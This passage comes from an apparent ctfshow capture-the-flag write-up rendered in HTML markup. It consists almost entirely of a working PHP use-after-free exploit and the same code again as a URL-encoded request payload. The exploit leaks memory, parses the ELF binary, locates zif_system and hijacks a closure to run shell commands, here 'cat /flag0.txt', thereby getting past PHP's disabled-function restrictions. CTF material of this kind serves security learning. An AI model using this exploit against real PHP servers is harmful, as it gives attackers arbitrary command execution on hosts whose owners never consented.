keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x786568326e6962</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1000</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x10102464c457f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token variable\">$addr</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$f_entry</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$f_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_name</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x6d6574737973</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token variable\">$addr</span> <span class=\"token operator\">+=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token variable\">$arg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$vuln</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$vuln</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'WIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'This PoC is for *nix systems only.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$n_alloc</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> \n    <span class=\"token variable\">$contiguous</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n_alloc</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token variable\">$contiguous</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$abc</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$helper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Helper</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">79</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UAF failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$closure_handlers</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc8</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$closure_obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_handlers</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't determine binary base address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$elf</span> <span class=\"token operator\">=</span> <span class=\"token function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't parse ELF header\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get basic_functions address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$zif_system</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Couldn't get zif_system address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x110</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$fake_obj_offset</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_obj</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$fake_obj_offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$zif_system</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\n    <span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag0.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#39;args&#39;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%